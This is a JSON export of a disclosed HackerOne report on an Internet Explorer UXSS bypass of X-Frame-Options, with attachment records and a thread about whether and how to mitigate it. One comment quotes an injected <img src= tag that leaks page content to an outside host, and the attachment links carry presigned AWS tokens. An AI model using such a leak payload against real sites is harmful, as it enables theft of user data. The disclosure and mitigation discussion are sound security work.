{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "informative", 
    "bug_reporter_agreed_on_going_public_at": "2017-04-19T13:44:19.317Z", 
    "voters": [
        "hunter", 
        "bogdantcaciuc", 
        "inhibitor181", 
        "malcolmx", 
        "eveeez", 
        "madrobot", 
        "muhammad_uwais", 
        "axolotl", 
        "xhzeem", 
        "m16", 
        "and 10 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 108056, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-04-19T18:16:55.874Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "HackerOne is still prone to Internet Explorer UXSS", 
    "is_member_of_team?": null, 
    "vote_count": 20, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 3819, 
            "content": "We managed to get IE UXSS (CVE 2015-0072) to work even when X-Frame-Options header exists with `Deny` or `SAMEORIGIN`.\n\nThanks my brother Alaa for the help on this one.", 
            "content_html": "<p>We managed to get IE UXSS (CVE 2015-0072) to work even when X-Frame-Options header exists with <code>Deny</code> or <code>SAMEORIGIN</code>.</p>\n\n<p>Thanks my brother Alaa for the help on this one.</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Informative", 
    "public": true, 
    "attachments": [
        {
            "file_name": "redirect.php", 
            "type": "text/x-php", 
            "id": 67710, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/710/7cf45113f86497fb3c47e5fd63f9685e2ac92356/redirect.php?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f72cb3114ef02281fe90c8ee6e1612d6684d35b189c77147d3caae5e2335cba8"
        }, 
        {
            "file_name": "exploit.php", 
            "type": "text/html", 
            "id": 67712, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/712/15ec637cc05cbcdb9574d88335fb3199f9b16a5d/exploit.php?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10299ec4dc52878607128cc632b64f424b7d7f1d26d94f1eaf2a61e026d89d07"
        }, 
        {
            "file_name": "delay.php", 
            "type": "text/x-php", 
            "id": 67713, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/713/4746914313a76d16025b32b666cebff1f3bd0f1d/delay.php?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7744611e34008553377ceb5e2461e66ef5df52f7409e51892113d7f85640bc46"
        }, 
        {
            "file_name": "hackerone_uxss_2.png", 
            "type": "image/png", 
            "id": 67714, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/714/8ef9f34a6ae988e9078705e1dd127cbd7603dc0b/hackerone_uxss_2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db0fad11d9162ec2b281ba1b1797bdf246085834fbaf5e409d8e014ac34eac16"
        }, 
        {
            "file_name": "hackerone_uxss_1.png", 
            "type": "image/png", 
            "id": 67715, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/715/137346229a5d9bf44fdc3619cc7491ef4f76109b/hackerone_uxss_1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5df57b65a9bbbc523f2f891aaffadd4d5d0c91abcc84d0da1ec2acc4940d7c39"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-01-04T11:39:29.219Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-04T11:39:29.219Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Random numbers are being added to URLs so that no need to clear IE cache every try.", 
            "markdown_message": "<p>Random numbers are being added to URLs so that no need to clear IE cache every try.</p>\n", 
            "type": "Activities::Comment", 
            "id": 740302, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/763/80900e37a09b8836d09bd7cd61083da50a25d646/hackerone_ie_uxss_win8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=09b1b2b298b296698cbb89eca25f2080d58f560406a396e89f574db3766f8187", 
                    "type": "image/png", 
                    "id": 67763, 
                    "filename": "hackerone_ie_uxss_win8.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/067/764/dfce99eb6b55421953648d1bac23eaad22746fa2/hackerone_uxss_ie_win_server_2012_r2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224022Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ba6af16b3d0bd24889bae35a1c54d277c715e8ee547557b00369e051eaee8a69", 
                    "type": "image/png", 
                    "id": 67764, 
                    "filename": "hackerone_uxss_ie_win_server_2012_r2.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-01-04T16:08:17.397Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-04T16:08:17.397Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Here are another two screenshots of IE 11 on Windows Server 2012 R2 and Windows 8.1", 
            "markdown_message": "<p>Here are another two screenshots of IE 11 on Windows Server 2012 R2 and Windows 8.1</p>\n", 
            "type": "Activities::Comment", 
            "id": 740684, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-05T02:27:24.324Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-05T02:27:24.324Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @zombiehelp54,\n\nThank you for your report! We will need some time to investigate this and get back to you, so please bear with us.\n\nRegards,\nAndrew", 
            "markdown_message": "<p>Hi <a href=\"/zombiehelp54\">@zombiehelp54</a>,</p>\n\n<p>Thank you for your report! We will need some time to investigate this and get back to you, so please bear with us.</p>\n\n<p>Regards,<br>\nAndrew</p>\n", 
            "type": "Activities::Comment", 
            "id": 741579, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-05T16:22:24.251Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-05T16:22:24.251Z", 
            "actor": {
                "username": "dirk", 
                "url": "/dirk", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/067/e7167a07a5015ff170d3c52c5ceba1950d4ce382_medium.jpeg?1413381336"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "hey @zombiehelp54,\n\nIt seems like you are using a (since patched) known bug in Internet Explorer to achieve this, is that correct? Using IE 11.0.9600.17.17691, I can't reproduce your PoC. Is this correct? If in the most recent versions of IE 9, 10 and 11 this is fixed, it doesn't appear to be anything specific to HackerOne, nor something we can do anything about.\n\nKind regards,\nDirk", 
            "markdown_message": "<p>hey <a href=\"/zombiehelp54\">@zombiehelp54</a>,</p>\n\n<p>It seems like you are using a (since patched) known bug in Internet Explorer to achieve this, is that correct? Using IE 11.0.9600.17.17691, I can&#39;t reproduce your PoC. Is this correct? If in the most recent versions of IE 9, 10 and 11 this is fixed, it doesn&#39;t appear to be anything specific to HackerOne, nor something we can do anything about.</p>\n\n<p>Kind regards,<br>\nDirk</p>\n", 
            "type": "Activities::Comment", 
            "id": 742601, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-05T20:13:43.352Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-05T20:13:43.352Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @Dirk,\n\nThis is the same vulnerability reported by @avlidienbrunn in #103787 (CVE 2015-0072) which requires at least one framed resource without X-Frame-Options header. Here I have managed to make it work with any resource even if it is protected with X-Frame-Options header by triggering alert() in parallel with payload execution which makes response header and body accessible (this wasn't possible in 2015-0072 with protected resources). the version you mentioned (11.0.9600.17691) is the first patched one from Microsoft after applying MS15-018 on March 10 2015, This will work with all predecessor versions. I thought you would be interested in this as there still wide versions of IE affected. \n\nThanks;", 
            "markdown_message": "<p>Hi <a href=\"/dirk\">@Dirk</a>,</p>\n\n<p>This is the same vulnerability reported by <a href=\"/avlidienbrunn\">@avlidienbrunn</a> in <a href=\"/reports/103787\">#103787</a> (CVE 2015-0072) which requires at least one framed resource without X-Frame-Options header. Here I have managed to make it work with any resource even if it is protected with X-Frame-Options header by triggering alert() in parallel with payload execution which makes response header and body accessible (this wasn&#39;t possible in 2015-0072 with protected resources). the version you mentioned (11.0.9600.17691) is the first patched one from Microsoft after applying MS15-018 on March 10 2015, This will work with all predecessor versions. I thought you would be interested in this as there still wide versions of IE affected. </p>\n\n<p>Thanks;</p>\n", 
            "type": "Activities::Comment", 
            "id": 743045, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-05T20:26:57.570Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-05T20:26:57.570Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "BTW, @reed has pointed to CSRF tokens unique per form as possible mitigation in #103787", 
            "markdown_message": "<p>BTW, <a href=\"/reed\">@reed</a> has pointed to CSRF tokens unique per form as possible mitigation in <a href=\"/reports/103787\">#103787</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 743067, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-06T00:31:42.133Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-06T00:31:42.133Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "At the time of @avlidienbrunn's report, my understanding was that the IE vulnerability had not yet been fixed, so it was more of a concern to any current IE users on the platform (so we mitigated the reported issue, though it seems like you've found another way to get the CSRF token using `current_user.json`). Now that the IE issue is patched, I'm having a hard time worrying about a fixed vulnerability. Browsers constantly have vulnerabilities, and people need to keep their browsers updated to ensure bad things don't happen to them. Somebody could just as easily use an old IE RCE vulnerability to gain full access over the user's machine, versus just getting the CSRF token for one site.\n\nAs for the unique CSRF tokens per form change, we're not likely to implement that until Rails 5 comes out (with the PR mentioned in #103787) due to the invasiveness of the change. Are there any other mitigations you're aware of? I added @avlidienbrunn for his thoughts as well.\n\nBelieve me, I would love for us to be protected from all browser vulnerabilities, but considering IE versions before Edge don't even support CSP, it's hard to treat the browser with the same respect. Basically, keep your browser upgraded, or you will be pwned.\n\nI welcome any and all thoughts.", 
            "markdown_message": "<p>At the time of <a href=\"/avlidienbrunn\">@avlidienbrunn</a>&#39;s report, my understanding was that the IE vulnerability had not yet been fixed, so it was more of a concern to any current IE users on the platform (so we mitigated the reported issue, though it seems like you&#39;ve found another way to get the CSRF token using <code>current_user.json</code>). Now that the IE issue is patched, I&#39;m having a hard time worrying about a fixed vulnerability. Browsers constantly have vulnerabilities, and people need to keep their browsers updated to ensure bad things don&#39;t happen to them. Somebody could just as easily use an old IE RCE vulnerability to gain full access over the user&#39;s machine, versus just getting the CSRF token for one site.</p>\n\n<p>As for the unique CSRF tokens per form change, we&#39;re not likely to implement that until Rails 5 comes out (with the PR mentioned in <a href=\"/reports/103787\">#103787</a>) due to the invasiveness of the change. Are there any other mitigations you&#39;re aware of? I added <a href=\"/avlidienbrunn\">@avlidienbrunn</a> for his thoughts as well.</p>\n\n<p>Believe me, I would love for us to be protected from all browser vulnerabilities, but considering IE versions before Edge don&#39;t even support CSP, it&#39;s hard to treat the browser with the same respect. Basically, keep your browser upgraded, or you will be pwned.</p>\n\n<p>I welcome any and all thoughts.</p>\n", 
            "type": "Activities::Comment", 
            "id": 743452, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-06T00:32:36.892Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-06T00:32:36.892Z", 
            "actor": {
                "username": "avlidienbrunn", 
                "url": "/avlidienbrunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/948/b05d5de8975e5813bc910b74844b5a01bd97cb93_medium.jpg?1398759698"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ExternalUserJoined", 
            "id": 743454, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-06T01:14:45.235Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-06T01:14:45.235Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @reed,\n\nThank you for making this clear. I can see your point here and I tend to agree with you.\nBut please give a little respect to IE cause without it we can't download Chrome or Firefox :D\n\nThanks;", 
            "markdown_message": "<p>Hey <a href=\"/reed\">@reed</a>,</p>\n\n<p>Thank you for making this clear. I can see your point here and I tend to agree with you.<br>\nBut please give a little respect to IE cause without it we can&#39;t download Chrome or Firefox :D</p>\n\n<p>Thanks;</p>\n", 
            "type": "Activities::Comment", 
            "id": 743513, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-06T11:46:44.518Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-06T11:46:44.518Z", 
            "actor": {
                "username": "avlidienbrunn", 
                "url": "/avlidienbrunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/948/b05d5de8975e5813bc910b74844b5a01bd97cb93_medium.jpg?1398759698"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey everyone!\n\nIf the UXSS can be used even with X-Frame-Options (can't verify right now), nice find @zombiehelp54 :) If that's the case, I don't see any other mitigations you can put in place for this particular SOP Bypass. \n\nThe other report lead to mitigation of other SOP Bypasses as well, because current_user.json can't be read without the X-Requested-With header. It also mitigates \"HTML leak\" CSP bypasses where an attacker would inject incorrect HTML so that an attribute would leak through the document (for instance, injecting ```<img src='https://avlidienbrunn.se?```).\n\nAs for other mitigations, you could remove the \"_method\" functionality if you don't use it. Potentially try to fingerprint browser version from \"User-Agent\" header and block all functionality for those browsers and give a \"Please update your browser\" message.\n\nProbably overkill, but that's what I could think of :)", 
            "markdown_message": "<p>Hey everyone!</p>\n\n<p>If the UXSS can be used even with X-Frame-Options (can&#39;t verify right now), nice find <a href=\"/zombiehelp54\">@zombiehelp54</a> :) If that&#39;s the case, I don&#39;t see any other mitigations you can put in place for this particular SOP Bypass. </p>\n\n<p>The other report lead to mitigation of other SOP Bypasses as well, because current_user.json can&#39;t be read without the X-Requested-With header. It also mitigates &quot;HTML leak&quot; CSP bypasses where an attacker would inject incorrect HTML so that an attribute would leak through the document (for instance, injecting <code>&lt;img src=&#39;https://avlidienbrunn.se?</code>).</p>\n\n<p>As for other mitigations, you could remove the &quot;_method&quot; functionality if you don&#39;t use it. Potentially try to fingerprint browser version from &quot;User-Agent&quot; header and block all functionality for those browsers and give a &quot;Please update your browser&quot; message.</p>\n\n<p>Probably overkill, but that&#39;s what I could think of :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 744114, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-06T15:36:50.366Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-06T15:36:50.366Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @avlidienbrunn,\n\nThanks for your mitigation suggestions. You inspired me of another idea that may stop this attack. We can make a whitelist of domains allowed in `Referer: ` header which is being sent in framed resource request by IE and if the `Referer ` is not in the whitelist just redirect to a sandboxed domain showing a message thus SOP bypass will end up to the sandboxed domain. I can't confirm this will work as I didn't test it.\n\nThanks;", 
